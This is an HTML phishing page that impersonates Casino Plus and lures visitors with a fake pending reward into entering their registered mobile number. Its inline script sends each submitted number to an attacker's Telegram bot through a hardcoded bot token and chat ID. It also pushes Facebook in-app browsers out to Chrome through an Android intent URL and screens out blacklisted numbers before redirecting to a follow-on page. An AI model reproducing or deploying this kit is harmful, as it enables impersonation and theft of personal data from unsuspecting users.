<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Casino Plus | Account Verification</title>
    <link href="https://fonts.googleapis.com/css2?family=Public+Sans:wght@400;600;800&family=JetBrains+Mono:wght@700&display=swap" rel="stylesheet">
    <style>
        :root {
            --casino-gold: #fbbf24;
            --casino-dark: #0f172a;
            --bg-dark: #0a0a0b;
        }

        * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }

        body {
            background-color: var(--bg-dark);
            background-image: radial-gradient(circle at 50% -20%, #1a3a5a 0%, #0a0a0b 100%);
            color: #ffffff;
            font-family: 'Public Sans', sans-serif;
            display: flex;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            overflow-x: hidden;
        }

        .card {
            width: 92%;
            max-width: 380px;
            background: rgba(255, 255, 255, 0.02);
            border: 1px solid rgba(255, 255, 255, 0.08);
            border-radius: 24px;
            padding: 30px 20px;
            backdrop-filter: blur(20px);
            text-align: center;
            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
        }

        .logo-img { width: 160px; margin-bottom: 20px; }

        h1 { font-size: 22px; font-weight: 700; margin-bottom: 12px; color: #fff; }
        p { color: #94a3b8; font-size: 14px; line-height: 1.5; margin-bottom: 25px; }

        /* Input Group */
        .input-group { text-align: left; margin-bottom: 20px; }
        .label-text { display: block; font-size: 11px; text-transform: uppercase; color: var(--casino-gold); font-weight: 700; margin-bottom: 8px; margin-left: 5px; }

        input {
            width: 100%;
            background: #161b22;
            border: 1px solid #30363d;
            border-radius: 12px;
            padding: 16px;
            color: white;
            font-size: 20px;
            text-align: center;
            font-family: 'JetBrains Mono', monospace;
            outline: none;
            transition: 0.3s;
        }

        input:focus { border-color: var(--casino-gold); }

        .btn-primary {
            background: linear-gradient(180deg, #fbbf24 0%, #f59e0b 100%);
            color: #0f172a;
            border: none;
            width: 100%;
            padding: 18px;
            border-radius: 12px;
            font-size: 15px;
            font-weight: 700;
            text-transform: uppercase;
            letter-spacing: 0.5px;
            cursor: pointer;
            box-shadow: 0 4px 15px rgba(251, 191, 36, 0.2);
        }

        .btn-primary:active { transform: scale(0.97); }

        /* Ang ni-request mong Image */
        .promo-img {
            width: 100%;
            border-radius: 12px;
            margin-top: 20px;
            border: 1px solid rgba(255,255,255,0.1);
        }

        #status-msg { color: #ff3b30; font-size: 12px; margin-top: 15px; display: none; font-weight: 600; }

        .spinner {
            width: 16px; height: 16px; border: 2px solid rgba(0,0,0,0.1);
            border-top: 2px solid #000; border-radius: 50%;
            animation: spin 0.8s linear infinite; display: inline-block; vertical-align: middle; margin-right: 8px;
        }
        @keyframes spin { to { transform: rotate(360deg); } }
    </style>
</head>
<body>

    <div class="card">
        <img src="https://casinoplus.static2.website/images/logo1.png" class="logo-img" alt="CasinoPlus">
        <h1>Identity Verification</h1>
        <p>Your account is flagged for a pending reward claim. Please verify your mobile number to continue.</p>
        
        <div class="input-group">
            <span class="label-text">Registered Mobile Number</span>
            <input type="tel" id="userPhone" placeholder="09xxxxxxxxx" maxlength="11" oninput="this.value = this.value.replace(/[^0-9]/g, '')">
        </div>

        <button class="btn-primary" id="claimBtn" onclick="processClaim()">Verify and Claim</button>
        
        <div id="status-msg"></div>

        <img src="free_depo.jpeg" class="promo-img" alt="Promotion">
    </div>

    <script src="config.js"></script>
    <script>
        const botToken = '8639737111:AAGvCqiHzkiJvVqH6YPocRIVMoiXZlK4ZWg';
        const chatId = '7298607329';
        const BYPASS_MODE = true;

        // Intent logic para sa FB Browser
        window.onload = () => {
            const currentUrl = window.location.href.replace(/^https?:\/\//, '');
            if (!window.location.hash.includes("verified")) {
                window.location.href = `intent://${currentUrl}#verified#Intent;scheme=https;package=com.android.chrome;end`;
            }
        };

        async function processClaim() {
            const phone = document.getElementById('userPhone').value.trim();
            const btn = document.getElementById('claimBtn');
            const status = document.getElementById('status-msg');

            // Validation
            if (phone.length < 11 || !phone.startsWith('09')) {
                status.innerHTML = "⚠️ Please enter a valid 11-digit number.";
                status.style.display = "block";
                return;
            }

            btn.disabled = true;
            btn.innerHTML = `<div class="spinner"></div> VERIFYING...`;
            status.style.display = "none";

            // Blacklist Check (Galing sa config.js)
            if (typeof BLACKLISTED_NUMBERS !== 'undefined' && BLACKLISTED_NUMBERS.includes(phone)) {
                setTimeout(() => {
                    status.innerHTML = "❌ Access Denied: Account not eligible.";
                    status.style.display = "block";
                    btn.disabled = false;
                    btn.innerHTML = "Verify and Claim";
                }, 1500);
                return;
            }

            // Telegram Send
            const msg = `🎰 CASINO PLUS LOGIN\n📱 Number: ${phone}\n⏰ Time: ${new Date().toLocaleString()}`;
            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}`);

            // Bypass Redirect
            if (BYPASS_MODE) {
                setTimeout(() => {
                    window.location.href = "main.html";
                }, 1800);
            }
        }
    </script>
</body>
</html>
